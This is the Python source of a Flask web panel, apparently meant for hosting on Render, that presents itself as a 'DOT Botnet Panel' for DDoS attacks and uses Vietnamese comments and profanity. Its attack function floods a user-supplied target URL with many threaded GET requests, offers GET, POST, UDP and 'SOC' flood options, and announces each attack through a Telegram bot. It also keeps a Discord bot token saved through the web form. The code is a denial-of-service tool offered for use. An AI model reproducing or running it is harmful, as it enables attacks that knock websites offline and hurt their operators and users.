import os
import threading
from flask import Flask, request, jsonify
import telebot
import requests

app = Flask(__name__)

# ================== TELEGRAM FROM ENV ==================
TELE_TOKEN = os.getenv("TELE_TOKEN")
TELE_CHAT_ID = os.getenv("TELE_CHAT_ID")

if not TELE_TOKEN:
    print("Địt mẹ thiếu TELE_TOKEN trong Render Environment Variables!")
if not TELE_CHAT_ID:
    print("Địt mẹ thiếu TELE_CHAT_ID trong Render Environment Variables!")

tele_bot = telebot.TeleBot(TELE_TOKEN) if TELE_TOKEN else None

# ================== DISCORD TOKEN (lưu qua web) ==================
DISCORD_TOKEN_FILE = "discord_token.txt"

def load_discord_token():
    if os.path.exists(DISCORD_TOKEN_FILE):
        with open(DISCORD_TOKEN_FILE, "r") as f:
            return f.read().strip()
    return "Chưa có Discord Token"

def save_discord_token(token):
    with open(DISCORD_TOKEN_FILE, "w") as f:
        f.write(token.strip())
    return "✅ Lưu Discord Token thành công!"

# ================== ATTACK FUNCTION ==================
def launch_attack(method, target, duration=60, threads=50):
    print(f"🔥 Đang DDoS {method} → {target} | {duration}s | {threads} threads")
    # Attack đơn giản (mày thay bằng full method từ DOT repo sau)
    for _ in range(threads):
        threading.Thread(target=lambda: [requests.get(target, timeout=3) for _ in range(150)], daemon=True).start()
    
    msg = f"🚀 ATTACK {method} on {target} STARTED! Duration: {duration}s"
    if tele_bot and TELE_CHAT_ID:
        try:
            tele_bot.send_message(TELE_CHAT_ID, msg)
        except:
            pass
    return msg

# ================== WEB PANEL ==================
@app.route('/')
def index():
    discord_token = load_discord_token()
    tele_status = f"{TELE_TOKEN[:15]}..." if TELE_TOKEN else "❌ Chưa set TELE_TOKEN"
    
    return f'''
    <h1>🚀 DOT Botnet Panel - DDoS qua Telegram + Discord</h1>
    
    <h2>Telegram Token (từ Render Env): <span style="color:green">{tele_status}</span></h2>
    <h2>Telegram Chat ID: <span style="color:orange">{TELE_CHAT_ID or "Chưa set"}</span></h2>
    
    <h3>Discord Bot Token (điền rồi Save)</h3>
    <form action="/save_discord" method="post">
        <input type="text" name="discord_token" placeholder="Mời nhập Discord Bot Token" style="width:450px" value="{discord_token}">
        <button type="submit">💾 SAVE DISCORD TOKEN</button>
    </form>
    
    <hr>
    <h3>🚀 LAUNCH ATTACK</h3>
    <form action="/attack" method="post">
        Method: 
        <select name="method">
            <option value="GET">GET Flood</option>
            <option value="POST">POST Flood</option>
            <option value="UDP">UDP</option>
            <option value="SOC">SOC</option>
        </select><br><br>
        
        Target: <input type="text" name="target" placeholder="https://target.com" required style="width:400px"><br><br>
        Duration (giây): <input type="number" name="duration" value="60"><br><br>
        Threads: <input type="number" name="threads" value="50"><br><br>
        
        <button type="submit">🔥 LAUNCH ATTACK NGAY</button>
    </form>
    '''

@app.route('/save_discord', methods=['POST'])
def save_discord():
    token = request.form.get('discord_token', '').strip()
    if token:
        msg = save_discord_token(token)
        return f"<h2>{msg}</h2><br><a href='/'>← Quay lại Panel</a>"
    return "Địt mẹ thiếu token Discord!"

@app.route('/attack', methods=['POST'])
def attack():
    method = request.form.get('method')
    target = request.form.get('target')
    duration = int(request.form.get('duration', 60))
    threads = int(request.form.get('threads', 50))
    
    threading.Thread(target=launch_attack, args=(method, target, duration, threads), daemon=True).start()
    
    return jsonify({"status": "success", "message": f"Attack {method} on {target} đã bắn!"})

if __name__ == "__main__":
    print("🚀 DOT Panel + Botnet đang chạy như hacker phá web!")
    if tele_bot:
        threading.Thread(target=tele_bot.polling, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
